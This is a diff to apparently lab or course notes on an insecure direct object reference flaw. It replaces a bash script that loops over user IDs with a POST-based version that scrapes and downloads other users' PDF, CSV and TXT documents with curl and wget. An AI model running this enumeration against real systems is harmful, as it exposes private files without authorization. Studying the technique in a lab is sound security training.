@@ -32,11 +32,33 @@ Then we can use a simple for loop to loop over the uid parameter and return the 
 ```
 #!/bin/bash
 
-url="http://SERVER_IP:PORT"
+url="http://<IP>:<PORT>"
 
-for i in {1..10}; do
-        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
-                wget -q $url/$link
-        done
+for i in {0..25}; do
+  echo "Checking UID $i..."
+
+  # Make POST request and extract file links of various types
+  response=$(curl -s "$url/documents.php" --compressed -X POST \
+    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' \
+    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' \
+    -H 'Accept-Language: en-US,en;q=0.5' \
+    -H 'Accept-Encoding: gzip, deflate' \
+    -H "Referer: $url/" \
+    -H 'Content-Type: application/x-www-form-urlencoded' \
+    -H "Origin: $url" \
+    -H 'DNT: 1' \
+    -H 'Connection: keep-alive' \
+    -H 'Upgrade-Insecure-Requests: 1' \
+    -H 'Sec-GPC: 1' \
+    -H 'Priority: u=0, i' \
+    --data-raw "uid=$i")
+
+  # Extract .pdf, .csv, .txt links (non-greedy, handles HTML fragments better)
+  echo "$response" | grep -oP "/documents/.*?\.(pdf|csv|txt)" | while read -r link; do
+    full_url="$url$link"
+    echo "Downloading $full_url"
+    wget -q "$full_url"
+  done
 done
+
 ```
